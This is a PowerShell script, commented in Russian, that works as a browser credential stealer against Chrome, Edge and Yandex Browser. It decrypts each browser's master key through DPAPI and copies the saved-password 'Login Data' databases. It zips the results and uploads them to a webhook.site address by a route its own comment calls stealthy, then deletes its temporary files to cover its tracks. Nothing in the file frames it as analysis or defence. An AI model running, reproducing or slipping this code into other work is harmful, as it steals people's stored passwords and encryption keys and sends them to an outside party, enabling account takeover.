# [ Настройки ]
$url = "https://webhook.site/94f7a3be-c2d7-4eaa-872b-7a1e5897bf12"
$workDir = "$env:TEMP\sys_cache_$(Get-Random)"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
$logFile = "$workDir\info.log"

# Функция сбора данных
function Export-Data($path, $state, $label) {
    if (Test-Path $state) {
        try {
            $json = Get-Content $state -Raw | ConvertFrom-Json
            $key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($json.os_crypt.encrypted_key).Length-1)]
            $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            Add-Content $logFile "[$label] Key: $([Convert]::ToBase64String($dec))"
            if (Test-Path $path) { Copy-Item $path -Destination "$workDir\$label`_db" -Force }
        } catch { Add-Content $logFile "[$label] Error: $_" }
    }
}

# Поиск по популярным браузерам и их профилям
$targets = @(
    @{n="CH"; p="Google\Chrome"},
    @{n="ED"; p="Microsoft\Edge"},
    @{n="YX"; p="Yandex\YandexBrowser"}
)

foreach ($t in $targets) {
    $base = "$env:LOCALAPPDATA\$($t.p)\User Data"
    if (Test-Path $base) {
        $profs = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "Default|Profile" }
        foreach ($pr in $profs) {
            $ld = Join-Path $pr.FullName "Login Data"
            $ls = Join-Path $base "Local State"
            if (Test-Path $ld) { Export-Data $ld $ls "$($t.n)_$($pr.Name)" }
        }
    }
}

# Упаковка и отправка через .NET (более скрытно)
if ((Get-ChildItem $workDir).Count -gt 0) {
    $zip = "$env:TEMP\report_$(Get-Random).zip"
    Compress-Archive -Path "$workDir\*" -DestinationPath $zip -Force
    try {
        $wc = New-Object System.Net.WebClient
        $wc.UploadFile($url, "POST", $zip) | Out-Null
    } catch {}
    Remove-Item $zip -ErrorAction SilentlyContinue
}

Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue
